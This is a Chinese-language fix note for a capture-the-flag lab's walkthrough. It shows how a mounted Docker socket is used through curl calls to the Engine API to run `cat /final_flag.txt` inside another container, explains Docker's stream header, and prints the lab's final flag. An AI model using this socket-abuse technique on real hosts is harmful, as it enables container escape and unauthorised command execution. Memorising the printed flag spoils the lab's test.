# Final Boss walkthrough：`/exec/{id}/start` 看不到 FLAG（缺少 stream header 處理）

> **日期：** 2026-06-13

## 1. 緣由

使用者照 `walkthrough.md` Final Boss 段落的步驟，透過
`/var/run/docker.sock` 的 Docker Engine API 在 `vault` 容器內執行
`cat /final_flag.txt`：

- Step 1-5（`ls docker.sock`、`/version`、列出容器、取得 `VAULT_ID`、
  建立 `EXEC_ID`）都正常執行成功
- Step 6（`POST /exec/${EXEC_ID}/start`）執行後**畫面完全沒有任何輸出**

## 2. 根因

Docker Engine API 的 `POST /exec/{id}/start`（`Tty:false` 時）回應格式
**不是純文字**，而是 Docker 的 stream multiplexing 格式：每一個輸出
chunk 前面都有 **8 bytes 的 header**：

```
[1 byte stream type][3 bytes padding][4 bytes big-endian 長度]
```

實測 `xxd` 看到的原始 bytes：

```
0100 0000 0000 001f  4573 6361 7065 446f 636b 6572 7b65 ...
└─ header (8B) ──┘   └─ "EscapeDocker{e7..." ──────────
   stream=1(stdout)
   length=0x1f=31
```

`walkthrough.md` 的 Step 6 直接把 `curl` 的回應印出來，**沒有處理這 8
bytes header**。這 8 bytes 裡包含 `\x01`、`\x00`（NUL）等不可印字元，
在瀏覽器的 xterm.js 終端機裡會被當成控制字元，導致**看起來完全沒有
輸出**（實際上 FLAG 文字就在後面，只是被前面的控制字元影響顯示）。

## 3. 修復

在 `curl` 後面加 `| tail -c +9`，跳過前 8 bytes 的 stream header：

```bash
curl -s -X POST \
  --unix-socket /var/run/docker.sock \
  -H "Content-Type: application/json" \
  -d '{"Detach":false,"Tty":false}' \
  "http://localhost/exec/${EXEC_ID}/start" | tail -c +9
```

（此修復假設輸出只有一個 frame，即 `cat /final_flag.txt` 的輸出小於
單一 frame 大小——對一行 FLAG 文字足夠。）

## 4. 驗證

```bash
$ docker exec -u player final bash -c '... | tail -c +9'
EscapeDocker{e78307053fd95ca8}
```

與 [[docker-sock-gid-mismatch]] 文件中記錄的 final FLAG一致。

## 5. 修改檔案清單

| 檔案 | 變更 |
|---|---|
| `walkthrough.md` | Final Boss Step 6 與「完整一行腳本」都加上 `\| tail -c +9`，並加註解說明 stream header 的問題 |
